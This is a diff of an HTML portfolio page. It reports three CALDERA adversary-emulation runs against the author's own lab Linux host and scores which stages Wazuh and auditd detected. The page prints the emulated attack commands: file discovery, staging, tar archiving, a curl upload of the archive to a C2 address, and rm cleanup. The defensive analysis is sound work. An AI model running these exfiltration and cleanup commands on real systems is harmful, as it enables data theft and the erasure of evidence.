@@ -4,8 +4,8 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="color-scheme" content="light dark">
-<meta name="description" content="CALDERA-emulated Linux discovery caught by auditd + Wazuh, mapped to MITRE ATT&CK.">
-<title>Endpoint Discovery Detection</title>
+<meta name="description" content="Three CALDERA operations against a monitored Linux host - discovery, collection, and a full exfiltration chain - scored honestly against Wazuh auditd detections.">
+<title>Adversary Emulation Scorecard</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap">
@@ -160,6 +160,34 @@
   .note{font-family:"IBM Plex Mono",monospace; font-size:.76rem; color:var(--faint); line-height:1.7; max-width:70ch}
   .note b{color:var(--muted)}
   hr.rule{border:0; border-top:1px solid var(--line); margin:0}
+
+  /* multi-op additions */
+  .vd{font-family:"IBM Plex Mono",monospace; font-size:.68rem; font-weight:600; padding:3px 8px;
+    border-radius:5px; white-space:nowrap; display:inline-block}
+  .vd.hit{background:var(--trust-soft); color:var(--trust-ink)}
+  .vd.miss{background:var(--attack-soft); color:var(--attack-ink)}
+  .vd.part{background:var(--surface-2); color:var(--muted); border:1px solid var(--line)}
+  table.dt{width:100%; border-collapse:collapse; font-size:.9rem; min-width:620px}
+  table.dt th{text-align:left; padding:9px 14px 9px 0; font-family:"IBM Plex Mono",monospace; font-size:.72rem;
+    letter-spacing:.1em; text-transform:uppercase; color:var(--faint); font-weight:500; border-bottom:1px solid var(--line)}
+  table.dt td{padding:8px 14px 8px 0; border-bottom:1px solid var(--line); vertical-align:top}
+  table.dt tr:last-child td{border-bottom:0}
+  table.dt td.m{font-family:"IBM Plex Mono",monospace; font-size:.84rem; font-variant-numeric:tabular-nums}
+  .ops{display:grid; grid-template-columns:repeat(auto-fit,minmax(min(100%,250px),1fr)); gap:16px}
+  .op{border:1px solid var(--line); border-left:3px solid var(--trust); border-radius:12px;
+    background:var(--surface); padding:18px 20px}
+  .op.mixed{border-left-color:var(--attack)}
+  .op .id{font-family:"IBM Plex Mono",monospace; font-size:.72rem; letter-spacing:.12em;
+    text-transform:uppercase; color:var(--faint); margin:0 0 8px}
+  .op h3{margin:0 0 8px; font-size:1rem; font-weight:600}
+  .op p{margin:0; font-size:.92rem; color:var(--muted)}
+  .tally{display:flex; gap:10px; flex-wrap:wrap; margin:0 0 22px}
+  .tally .t{flex:1; min-width:150px; border:1px solid var(--line); border-radius:10px;
+    background:var(--surface); padding:14px 16px}
+  .tally .t b{display:block; font-family:"IBM Plex Mono",monospace; font-size:1.6rem; line-height:1.2}
+  .tally .t.hit b{color:var(--trust-ink)}
+  .tally .t.miss b{color:var(--attack-ink)}
+  .tally .t span{font-size:.82rem; color:var(--muted)}
 </style>
 </head>
 <body>
@@ -167,62 +195,221 @@
   <p style="padding-top:22px;margin:0"><a href="./" style="font-family:'IBM Plex Mono',monospace;font-size:.8rem;letter-spacing:.04em;color:var(--muted);text-decoration:none">&larr; Portfolio</a></p>
   <header class="mast">
     <p class="eyebrow">Detection Engineering<span class="sep">/</span>Endpoint<span class="sep">/</span>Portfolio</p>
-    <h1>Catching Discovery on the Endpoint</h1>
-    <p class="thesis">Adversary emulation with <b>CALDERA</b>, endpoint telemetry from <b>auditd</b>, and detection in <b>Wazuh</b> — emulate the discovery an intruder runs in their first minutes on a host, then prove every command raises a MITRE-mapped alert.</p>
+    <h1>What Three Emulations Caught &mdash; and What They Missed</h1>
+    <p class="thesis">Three <b>CALDERA</b> operations against a monitored Linux host, escalating from first-minutes discovery to a complete collection-and-exfiltration chain. <b>auditd</b> captured every command. <b>Wazuh</b> alerted on two stages out of seven &mdash; and the gap list turned out to be the valuable half.</p>
     <div class="meta">
-      <span class="chip"><b>Emulation</b> CALDERA · Sandcat</span>
+      <span class="chip"><b>Emulation</b> CALDERA &middot; Sandcat</span>
       <span class="chip"><b>Telemetry</b> Linux auditd</span>
-      <span class="chip ok"><span class="dot"></span>9 rules · 8 techniques</span>
+      <span class="chip"><b>Operations</b> 3</span>
+      <span class="chip ok"><span class="dot"></span>9 rules &middot; 8 techniques</span>
     </div>
   </header>
   <hr class="rule">
 
   <section style="padding-bottom:6px">
     <p class="kicker">Overview</p>
-    <p style="font-size:1.06rem;line-height:1.75;color:var(--muted);max-width:66ch;margin:0">Perimeter and SIEM detections watch traffic; they do not watch what an intruder types once they are on a host. This is the <b>endpoint layer</b> — emulating an attacker’s first-minutes reconnaissance with CALDERA, and proving Linux auditd and Wazuh turn each command into a MITRE-mapped alert.</p>
+    <p style="font-size:1.06rem;line-height:1.75;color:var(--muted);max-width:66ch;margin:0">Perimeter and SIEM detections watch traffic; they do not watch what an intruder types once they are on a host. This is the <b>endpoint layer</b> &mdash; three adversary-emulation runs against a Linux host under Wazuh and auditd, each one harder than the last. The first proved the detections fire. The second proved some of them fire at the <i>wrong things</i>. The third ran a full exfiltration chain and showed exactly where the coverage ran out.</p>
   </section>
 
   <section>
-    <p class="kicker">The emulation</p>
-    <h2>What the agent actually ran</h2>
-    <p class="lede">A CALDERA Sandcat agent executed a realistic discovery sequence — the reconnaissance an attacker runs to understand where they’ve landed. The agent binary itself was planted as <span class="mono">/root/splunkd</span>, masquerading as a legitimate service (T1036).</p>
-    <div class="term siem"><div class="term-head"><span class="term-host siem">victim host · auditd</span><span class="term-what">emulated discovery</span></div>
+    <p class="kicker">The campaign</p>
+    <h2>Three operations, escalating</h2>
+    <p class="lede">Each run used a CALDERA Sandcat agent running as root on the victim host, beaconing to a C2 server on the lab's attack box.</p>
+    <div class="ops">
+      <div class="op">
+        <p class="id">OP-001 &middot; Discovery</p>
+        <h3>First minutes on the box</h3>
+        <p>37 steps of enumeration &mdash; who am I, what accounts exist, what is running. Nine rules written against it, one per behaviour. Every technique alerted.</p>
+      </div>
+      <div class="op mixed">
+        <p class="id">OP-002 &middot; Collection</p>
+        <h3>The SIEM catches itself</h3>
+        <p>A file-search run that detected correctly &mdash; and simultaneously exposed five rules firing on Wazuh's own maintenance, cron, and snapd activity.</p>
+      </div>
+      <div class="op mixed">
+        <p class="id">OP-003 &middot; Super Spy</p>
+        <h3>The whole chain</h3>
+        <p>Stage, collect, archive, exfiltrate, clean up. Seven stages executed. Two alerted. The other five existed only in raw telemetry.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <p class="kicker">OP-001 &middot; the emulation</p>
+    <h2>Discovery, and a binary pretending to be Splunk</h2>
+    <p class="lede">A Sandcat agent executed a realistic reconnaissance sequence as <span class="mono">root</span>. The agent binary itself was planted at <span class="mono">/root/splunkd</span> &mdash; masquerading as a legitimate logging daemon, which is the detail worth catching (T1036).</p>
+    <div class="term siem"><div class="term-head"><span class="term-host siem">victim-linux1 &middot; auditd</span><span class="term-what">op-001 &middot; 37 steps &middot; agent running as root, elevated</span></div>
     <pre><span class="out">whoami                     # who am I
 cat /etc/passwd            # local accounts
-ps aux | grep ...          # running processes
+ps aux | grep ...          # running processes  (34 executions)
 groups                     # group membership
 hostname ; uname -a        # system identity
 ip addr ; ip route         # network config</span></pre></div>
-    <div class="proves"><span class="arw">maps to</span><span>T1033, T1087.001, T1057, T1069.001, T1082, T1016 — the standard Discovery tactic, emulated end to end.</span></div>
+    <div class="proves"><span class="arw">the tell</span><span>A process named <b>splunkd</b> that lives in <span class="mono">/root</span> rather than a package path, spawning discovery commands. The name is meant to survive a glance at <span class="mono">ps</span>; the path is what gives it away.</span></div>
   </section>
+
   <section>
-    <p class="kicker">The detections</p>
+    <p class="kicker">OP-001 &middot; the detections</p>
     <h2>Nine rules, each mapped to a technique</h2>
-    <p class="lede">auditd captures the execve; Wazuh decodes it and fires a rule per behaviour. Detection is validated on the dashboard, not assumed.</p>
+    <p class="lede">auditd captures the execve; Wazuh decodes it and fires a rule per behaviour. Validated on the dashboard, not assumed.</p>
     <div class="flow-scroll">
-    <table style="width:100%;border-collapse:collapse;font-size:.9rem;min-width:600px">
-      <thead><tr style="text-align:left;border-bottom:1px solid var(--line)">
-        <th style="padding:9px 14px 9px 0;font-family:'IBM Plex Mono',monospace;font-size:.72rem;letter-spacing:.1em;text-transform:uppercase;color:var(--faint);font-weight:500">Rule</th>
-        <th style="padding:9px 14px;font-family:'IBM Plex Mono',monospace;font-size:.72rem;letter-spacing:.1em;text-transform:uppercase;color:var(--faint);font-weight:500">Behaviour</th>
-        <th style="padding:9px 0 9px 14px;font-family:'IBM Plex Mono',monospace;font-size:.72rem;letter-spacing:.1em;text-transform:uppercase;color:var(--faint);font-weight:500">MITRE</th></tr></thead>
-      <tbody class="mono" style="font-variant-numeric:tabular-nums"><tr style="border-bottom:1px solid var(--line)"><td style="padding:8px 14px 8px 0;color:var(--trust-ink)">100200</td><td style="padding:8px 14px;font-family:'IBM Plex Sans',sans-serif">whoami executed</td><td style="padding:8px 0 8px 14px;color:var(--muted)">T1033</td></tr><tr style="border-bottom:1px solid var(--line)"><td style="padding:8px 14px 8px 0;color:var(--trust-ink)">100201</td><td style="padding:8px 14px;font-family:'IBM Plex Sans',sans-serif">Sandcat binary /root/splunkd</td><td style="padding:8px 0 8px 14px;color:var(--muted)">T1059</td></tr><tr style="border-bottom:1px solid var(--line)"><td style="padding:8px 14px 8px 0;color:var(--trust-ink)">100202</td><td style="padding:8px 14px;font-family:'IBM Plex Sans',sans-serif">Python version discovery</td><td style="padding:8px 0 8px 14px;color:var(--muted)">T1518</td></tr><tr style="border-bottom:1px solid var(--line)"><td style="padding:8px 14px 8px 0;color:var(--trust-ink)">100203</td><td style="padding:8px 14px;font-family:'IBM Plex Sans',sans-serif">Hostname discovery</td><td style="padding:8px 0 8px 14px;color:var(--muted)">T1082</td></tr><tr style="border-bottom:1px solid var(--line)"><td style="padding:8px 14px 8px 0;color:var(--trust-ink)">100204</td><td style="padding:8px 14px;font-family:'IBM Plex Sans',sans-serif">uname system discovery</td><td style="padding:8px 0 8px 14px;color:var(--muted)">T1082</td></tr><tr style="border-bottom:1px solid var(--line)"><td style="padding:8px 14px 8px 0;color:var(--trust-ink)">100205</td><td style="padding:8px 14px;font-family:'IBM Plex Sans',sans-serif">IP / network config discovery</td><td style="padding:8px 0 8px 14px;color:var(--muted)">T1016</td></tr><tr style="border-bottom:1px solid var(--line)"><td style="padding:8px 14px 8px 0;color:var(--trust-ink)">100206</td><td style="padding:8px 14px;font-family:'IBM Plex Sans',sans-serif">Process discovery via ps</td><td style="padding:8px 0 8px 14px;color:var(--muted)">T1057</td></tr><tr style="border-bottom:1px solid var(--line)"><td style="padding:8px 14px 8px 0;color:var(--trust-ink)">100207</td><td style="padding:8px 14px;font-family:'IBM Plex Sans',sans-serif">Local accounts via /etc/passwd</td><td style="padding:8px 0 8px 14px;color:var(--muted)">T1087.001</td></tr><tr style="border-bottom:1px solid var(--line)"><td style="padding:8px 14px 8px 0;color:var(--trust-ink)">100208</td><td style="padding:8px 14px;font-family:'IBM Plex Sans',sans-serif">Local groups via groups</td><td style="padding:8px 0 8px 14px;color:var(--muted)">T1069.001</td></tr></tbody></table></div>
+    <table class="dt">
+      <thead><tr><th>Rule</th><th>Behaviour</th><th>MITRE</th></tr></thead>
+      <tbody>
+        <tr><td class="m" style="color:var(--trust-ink)">100200</td><td>whoami executed</td><td class="m" style="color:var(--muted)">T1033</td></tr>
+        <tr><td class="m" style="color:var(--trust-ink)">100201</td><td>Sandcat binary executed from /root/splunkd</td><td class="m" style="color:var(--muted)">T1059 &middot; T1036</td></tr>
+        <tr><td class="m" style="color:var(--trust-ink)">100202</td><td>Python version discovery</td><td class="m" style="color:var(--muted)">T1518</td></tr>
+        <tr><td class="m" style="color:var(--trust-ink)">100203</td><td>Hostname discovery</td><td class="m" style="color:var(--muted)">T1082</td></tr>
+        <tr><td class="m" style="color:var(--trust-ink)">100204</td><td>uname system discovery</td><td class="m" style="color:var(--muted)">T1082</td></tr>
+        <tr><td class="m" style="color:var(--trust-ink)">100205</td><td>IP / network config discovery</td><td class="m" style="color:var(--muted)">T1016</td></tr>
+        <tr><td class="m" style="color:var(--trust-ink)">100206</td><td>Process discovery via ps</td><td class="m" style="color:var(--muted)">T1057</td></tr>
+        <tr><td class="m" style="color:var(--trust-ink)">100207</td><td>Local accounts via /etc/passwd</td><td class="m" style="color:var(--muted)">T1087.001</td></tr>
+        <tr><td class="m" style="color:var(--trust-ink)">100208</td><td>Local groups via groups</td><td class="m" style="color:var(--muted)">T1069.001</td></tr>
+      </tbody></table></div>
   </section>
+
   <section>
-    <p class="kicker">What it demonstrates</p>
-    <h2>Endpoint detection, driven by emulation</h2>
-    <div class="grid">
-      <div class="card"><h3>Emulation-driven</h3><p>Detections were written against a real adversary-emulation run, not hypothetical commands.</p></div>
-      <div class="card"><h3>ATT&amp;CK-mapped</h3><p>Every rule ties to a technique, so coverage is expressed in the language a SOC reports in.</p></div>
-      <div class="card"><h3>Endpoint depth</h3><p>Detection at the host via auditd — complementary to the perimeter and SIEM work, covering a different layer.</p></div>
+    <p class="kicker">OP-002 &middot; the uncomfortable result</p>
+    <h2>Five rules were watching the SIEM, not the attacker</h2>
+    <p class="lede">The second operation was collection-focused: CALDERA searched the filesystem for small media and config files, staged them, and cleaned up. Wazuh detected the search correctly. It also produced a pile of alerts that had nothing to do with the emulation.</p>
+    <div class="term siem"><div class="term-head"><span class="term-host siem">victim-linux1 &middot; auditd</span><span class="term-what">op-002 &middot; collection via atomic planner</span></div>
+    <pre><span class="cmd">find / -name '*.png' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5</span>
+<span class="cmd">find / -name '*.yml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5</span>
+<span class="cmd">mkdir -p staged &amp;&amp; echo $PWD/staged</span>
+<span class="out">
+100237  find command executed for file and directory discovery   <span class="hl-trust">ALERT</span>
+100306  clustered filesystem and system discovery behaviour      <span class="hl-trust">ALERT</span>
+        mkdir into staged/                                       <span class="hl-atk">archives only</span></span></pre></div>
+    <p class="lede" style="margin-top:22px">The noise was the finding. Filtering the same alert window revealed rules that fire on ordinary system behaviour:</p>
+    <div class="flow-scroll">
+    <table class="dt">
+      <thead><tr><th>Rule</th><th>Fired on</th><th>Source</th><th>Verdict</th></tr></thead>
+      <tbody>
+        <tr><td class="m">100232</td><td>netstat, repeatedly</td><td class="m" style="color:var(--muted)">cwd=/var/ossec</td><td><span class="vd miss">Wazuh self-noise</span></td></tr>
+        <tr><td class="m">100234</td><td>df, repeatedly</td><td class="m" style="color:var(--muted)">cwd=/var/ossec</td><td><span class="vd miss">Wazuh self-noise</span></td></tr>
+        <tr><td class="m">100212</td><td>/etc/shadow reads</td><td class="m" style="color:var(--muted)">cron, wazuh-modulesd</td><td><span class="vd part">benign, allowlist</span></td></tr>
+        <tr><td class="m">100219</td><td>systemctl --version, is-enabled</td><td class="m" style="color:var(--muted)">snapd.apparmor</td><td><span class="vd part">too broad</span></td></tr>
+        <tr><td class="m">100235</td><td>mount -t squashfs, umount</td><td class="m" style="color:var(--muted)">snap / apparmor</td><td><span class="vd part">too broad</span></td></tr>
+      </tbody></table></div>
+    <div class="grid" style="margin-top:22px">
+      <div class="card flaw"><h3>The structural lesson</h3><p>Correlation rules <b>inherit the noise of their children</b>. Clusters <code>100301</code>&ndash;<code>100306</code> looked like strong signal until the child rules underneath them were traced back to cron and <code>snapd</code>. Tune children first, then re-evaluate the cluster &mdash; never the other way round.</p></div>
+      <div class="card tell"><h3>The scoping fix</h3><p>Filtering on <code>data.audit.cwd=/opt/caldera-agent</code> separated emulated activity from environmental activity cleanly. A detection that cannot distinguish the attacker from the monitoring agent is not yet a detection.</p></div>
+      <div class="card tell"><h3>Ground truth beat the dashboard</h3><p><code>archives.json</code> was consistently more reliable than dashboard visualisations for establishing what actually executed. The dashboard shows what alerted; the archive shows what happened.</p></div>
+    </div>
+  </section>
+
+  <section>
+    <p class="kicker">OP-003 &middot; Super Spy</p>
+    <h2>A complete exfiltration chain, scored stage by stage</h2>
+    <p class="lede">The third operation ran CALDERA's Super Spy adversary end to end: create a staging directory, hunt for files, copy them in, compress the result, upload it to C2, then erase the evidence. Seven stages. Every one of them landed in auditd. Two of them alerted.</p>
+    <figure class="flow">
+      <div class="flow-scroll">
+      <svg viewBox="0 0 980 200" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Seven-stage exfiltration chain; only the find and curl stages produced Wazuh alerts.">
+        <g class="svg-sub" fill="currentColor" opacity=".55" text-anchor="middle">
+          <text x="76" y="22">05:00:15</text><text x="214" y="22">05:00:55</text><text x="352" y="22">05:03:55</text>
+          <text x="490" y="22">05:06:15</text><text x="628" y="22">05:07:15</text><text x="766" y="22">05:10:11</text><text x="904" y="22">05:10:13</text>
+        </g>
+        <rect class="n-box n-atk"   x="15"  y="38" width="122" height="62" rx="8"/>
+        <rect class="n-box n-trust" x="153" y="38" width="122" height="62" rx="8"/>
+        <rect class="n-box n-atk"   x="291" y="38" width="122" height="62" rx="8"/>
+        <rect class="n-box n-atk"   x="429" y="38" width="122" height="62" rx="8"/>
+        <rect class="n-box n-trust" x="567" y="38" width="122" height="62" rx="8"/>
+        <rect class="n-box n-atk"   x="705" y="38" width="122" height="62" rx="8"/>
+        <rect class="n-box n-atk"   x="843" y="38" width="122" height="62" rx="8"/>
+        <g class="svg-title" text-anchor="middle">
+          <text class="n-atk-t"   x="76"  y="66">mkdir staged</text>
+          <text class="n-trust-t" x="214" y="66">find</text>
+          <text class="n-atk-t"   x="352" y="66">cp &rarr; staged</text>
+          <text class="n-atk-t"   x="490" y="66">tar &middot; gzip</text>
+          <text class="n-trust-t" x="628" y="66">curl upload</text>
+          <text class="n-atk-t"   x="766" y="66">rm archive</text>
+          <text class="n-atk-t"   x="904" y="66">rm -rf staged</text>
+        </g>
+        <g class="svg-sub n-sub" text-anchor="middle">
+          <text x="76"  y="86">T1074.001</text><text x="214" y="86">T1083</text><text x="352" y="86">T1074.001</text>
+          <text x="490" y="86">T1560.001</text><text x="628" y="86">T1041</text><text x="766" y="86">T1070</text><text x="904" y="86">T1070</text>
+        </g>
+        <g class="edge" stroke-linecap="round">
+          <path d="M137 69 L151 69"/><path d="M275 69 L289 69"/><path d="M413 69 L427 69"/>
+          <path d="M551 69 L565 69"/><path d="M689 69 L703 69"/><path d="M827 69 L841 69"/>
+        </g>
+        <g class="svg-zone" text-anchor="middle">
+          <text class="zone-atk"   x="76"  y="128">ARCHIVE ONLY</text>
+          <text class="zone-trust" x="214" y="128">ALERT 100237</text>
+          <text class="zone-atk"   x="352" y="128">ARCHIVE ONLY</text>
+          <text class="zone-atk"   x="490" y="128">ARCHIVE ONLY</text>
+          <text class="zone-trust" x="628" y="128">ALERT 100214</text>
+          <text class="zone-atk"   x="766" y="128">ARCHIVE ONLY</text>
+          <text class="zone-atk"   x="904" y="128">ARCHIVE ONLY</text>
+        </g>
+        <line class="boundary" x1="15" y1="152" x2="965" y2="152"/>
+        <text class="boundary-lbl" x="15" y="174">AUDITD CAPTURED ALL SEVEN &mdash; WAZUH ALERTED ON TWO</text>
+      </svg>
+      </div>
+      <figcaption><b>The chain that mattered was the quiet part.</b> Discovery and the outbound upload both raised alerts. Staging, copying, archiving and cleanup &mdash; the stages that turn a foothold into a data breach &mdash; passed without one, despite being fully present in raw telemetry.</figcaption>
+    </figure>
+  </section>
+
+  <section>
+    <p class="kicker">OP-003 &middot; the evidence</p>
+    <h2>What the agent actually ran</h2>
+    <div class="term siem"><div class="term-head"><span class="term-host siem">victim-linux1 &middot; auditd archives</span><span class="term-what">op-003 &middot; agent as root from /opt/caldera-agent/sandcat</span></div>
+    <pre><span class="cmd">find / -name '*.wav' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5</span>
+<span class="cmd">mkdir -p staged</span>
+<span class="cmd">cp /usr/share/gitweb/static/git-logo.png /opt/caldera-agent/staged</span>
+<span class="cmd">cp /usr/share/perl/5.38.2/CPAN/Kwalify/distroprefs.yml /opt/caldera-agent/staged</span>
+<span class="cmd">tar -P -zcf /opt/caldera-agent/staged.tar.gz /opt/caldera-agent/staged</span>
+<span class="cmd">curl -F "data=@/opt/caldera-agent/staged.tar.gz" --header "X-Request-ID: `hostname`-kukoop" http://198.51.100.20:8888/file/upload</span>
+<span class="cmd">rm /opt/caldera-agent/staged.tar.gz ; rm -rf staged</span></pre></div>
+    <div class="proves"><span class="arw">note</span><span>The agent had moved. OP-001 ran from <span class="mono">/root/splunkd</span>; by OP-003 the trusted agent was a persistent service at <span class="mono">/opt/caldera-agent/sandcat</span>. A rule pinned to the old path would have <b>silently stopped matching</b> &mdash; a reminder that path-based detections decay as the adversary's own tooling changes.</span></div>
+  </section>
+
+  <section>
+    <p class="kicker">The scorecard</p>
+    <h2>Honest coverage</h2>
+    <div class="tally">
+      <div class="t hit"><b>4</b><span>confirmed alert hits</span></div>
+      <div class="t miss"><b>5</b><span>behaviours with telemetry but no alert</span></div>
+      <div class="t"><b>8</b><span>benign events wrongly flagged in the same window</span></div>
+    </div>
+    <div class="flow-scroll">
+    <table class="dt">
+      <thead><tr><th>Technique</th><th>Behaviour</th><th>Rule</th><th>Result</th></tr></thead>
+      <tbody>
+        <tr><td class="m">T1083</td><td>File and directory discovery</td><td class="m" style="color:var(--trust-ink)">100237 &middot; 100306</td><td><span class="vd hit">Hit</span></td></tr>
+        <tr><td class="m">T1041</td><td>Exfiltration over C2 channel</td><td class="m" style="color:var(--trust-ink)">100214</td><td><span class="vd part">Hit, mislabelled</span></td></tr>
+        <tr><td class="m">T1082</td><td>hostname, inside the curl header</td><td class="m" style="color:var(--trust-ink)">100203</td><td><span class="vd hit">Minor hit</span></td></tr>
+        <tr><td class="m">T1005</td><td>Data from local system</td><td class="m" style="color:var(--muted)">100237 (as T1083)</td><td><span class="vd part">Partial</span></td></tr>
+        <tr><td class="m">T1074.001</td><td>Local data staging &mdash; mkdir, cp</td><td class="m" style="color:var(--muted)">none</td><td><span class="vd miss">Miss</span></td></tr>
+        <tr><td class="m">T1560.001</td><td>Archive collected data &mdash; tar, gzip</td><td class="m" style="color:var(--muted)">none</td><td><span class="vd miss">Miss</span></td></tr>
+        <tr><td class="m">T1070</td><td>Cleanup of staged artefacts &mdash; rm</td><td class="m" style="color:var(--muted)">none</td><td><span class="vd miss">Miss</span></td></tr>
+        <tr><td class="m">&mdash;</td><td>C2 session to the attack host</td><td class="m" style="color:var(--muted)">visible via ss only</td><td><span class="vd miss">No alert</span></td></tr>
+      </tbody></table></div>
+    <div class="grid" style="margin-top:22px">
+      <div class="card flaw"><h3>The mislabel worth fixing</h3><p>Rule <code>100214</code> fired on the exfiltration &mdash; but its description reads <i>&ldquo;possible ingress tool transfer&rdquo;</i>. This was <b>outbound</b>: <code>curl -F data=@&hellip;</code> to <code>/file/upload</code>. An analyst triaging that alert would have been told the opposite of what happened. A rule that fires on the right event and describes the wrong direction is a false sense of coverage.</p></div>
+      <div class="card flaw"><h3>The shape of the gap</h3><p>Every miss sits between collection and exfiltration &mdash; exactly the window where an intrusion becomes a breach. Discovery is loud and well covered; the quiet middle was not covered at all.</p></div>
+      <div class="card tell"><h3>Why the misses are the deliverable</h3><p>All five missed behaviours were <b>present in <code>archives.json</code></b>. Telemetry was never the problem &mdash; rule coverage was. That distinction decides whether the fix is a new sensor or a new rule, and here it was unambiguously a rule.</p></div>
+    </div>
+  </section>
+
+  <section>
+    <p class="kicker">What changed</p>
+    <h2>The rules the gaps produced</h2>
+    <div class="fix">
+      <div class="fix-item"><span class="fix-tag det">T1074.001</span><p><b>Local staging detection</b> &mdash; alert on <code>mkdir</code> of a staging directory and <code>cp</code> into it from an agent working directory, the pattern common to every collection framework.</p></div>
+      <div class="fix-item"><span class="fix-tag det">T1560.001</span><p><b>Archive-before-exfil</b> &mdash; <code>tar</code>/<code>gzip</code> producing an archive inside a directory that just received copied files. The sequence is the signal, not the utility.</p></div>
+      <div class="fix-item"><span class="fix-tag now">100214</span><p><b>Split ingress from egress</b> &mdash; a higher-confidence child rule for <code>curl -F data=@</code> and <code>/file/upload</code>, described as exfiltration, so the alert text matches the direction of travel.</p></div>
+      <div class="fix-item"><span class="fix-tag det">T1070</span><p><b>Cleanup as corroboration</b> &mdash; removal of a staged archive is weak alone, but strong when it closes a chain that already showed staging and compression.</p></div>
+      <div class="fix-item"><span class="fix-tag now">Tuning</span><p><b>Scope the noisy five</b> &mdash; exclude <code>cwd=/var/ossec</code> from the netstat and df rules, allowlist <code>cron</code> and <code>wazuh-modulesd</code> for shadow reads, and restrict the systemctl rule to service-management verbs rather than <code>--version</code>.</p></div>
     </div>
   </section>
 
   <section>
     <p class="kicker">Takeaway</p>
-    <p style="font-size:1.06rem;line-height:1.75;color:var(--ink);max-width:66ch;margin:0"><b>Endpoint discovery is often where an intrusion first becomes visible</b>, and it is low-signal by nature — a single <span class="mono">whoami</span> is nothing; the pattern is everything. Mapping each behaviour to ATT&CK turns a pile of exec events into coverage a SOC can report on, and reason about the gaps in.</p>
+    <p style="font-size:1.06rem;line-height:1.75;color:var(--ink);max-width:66ch;margin:0"><b>A detection pack that only reports its hits is marketing.</b> Three emulations produced nine working rules and a nine-item defect list &mdash; five uncovered behaviours, one alert describing the wrong direction, and five rules watching the monitoring stack instead of the adversary. None of that surfaces from reading rule definitions; it surfaces from running an adversary against them and scoring the result honestly. The chain a real intrusion follows &mdash; stage, archive, exfiltrate, erase &mdash; ran end to end through a monitored host and raised two alerts. Knowing that is worth more than the nine rules that worked.</p>
   </section>
 
-  <footer><p class="note"><b>Authorized lab.</b> CALDERA adversary emulation against the author’s own host. MITRE ATT&amp;CK: Discovery (TA0007) — T1033, T1087.001, T1057, T1069.001, T1082, T1016, plus T1036 and T1518.</p></footer>
+  <footer><p class="note"><b>Authorized lab.</b> CALDERA adversary emulation against the author's own hosts, across three operations. Addresses are documentation ranges; lab identifiers are redacted. MITRE ATT&amp;CK: T1033, T1036, T1057, T1069.001, T1082, T1087.001, T1016, T1518, T1059 (Discovery &middot; Execution); T1005, T1074.001, T1083 (Collection); T1560.001 (Archive); T1041 (Exfiltration); T1070 (Defense Evasion).</p></footer>
 </div>
 </body>
 </html>
